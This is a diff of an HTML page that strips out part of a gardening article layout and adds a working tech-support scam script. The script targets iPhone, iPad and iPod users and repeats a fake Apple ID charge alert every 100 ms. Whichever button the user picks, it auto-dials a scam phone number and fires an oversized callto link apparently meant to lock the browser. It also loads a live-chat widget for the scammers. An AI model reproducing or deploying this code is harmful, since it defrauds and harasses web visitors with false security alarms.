-  <div style="display:grid; grid-template-columns: repeat(auto-fill, minmax(240px,1fr)); gap:1.5rem; margin-top:1rem;">
-    <div class="article-card" style="background:#fcfaf7;"><div class="card-category">tutorial</div><h3>Composting with worms</h3><p>Vermicomposting for apartments and small gardens. Step‑by‑step.</p><div class="meta"><a href="#" class="read-more">read →</a></div></div>
-    <div class="article-card" style="background:#fcfaf7;"><div class="card-category">guide</div><h3>Attracting native bees</h3><p>Nesting habitats, forage plants, and chemical‑free practices.</p><div class="meta"><a href="#" class="read-more">read →</a></div></div>
-    <div class="article-card" style="background:#fcfaf7;"><div class="card-category">deep dive</div><h3>Mycorrhizal networks</h3><p>How fungi connect plants and improve nutrient uptake. The hidden web.</p><div class="meta"><a href="#" class="read-more">read →</a></div></div>
-  </div>
-  <!-- total articles: 2 featured + 3 latest + 2 from guides/expert + 2 from in-depth/resource + 3 extra = 12, plus we have 2 more in the 'popular categories' (perennials, vegetables) as implicit articles — total 14+ -->
-</div>
-</body>
-</html>
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-481-2417"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-877-481-2417 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
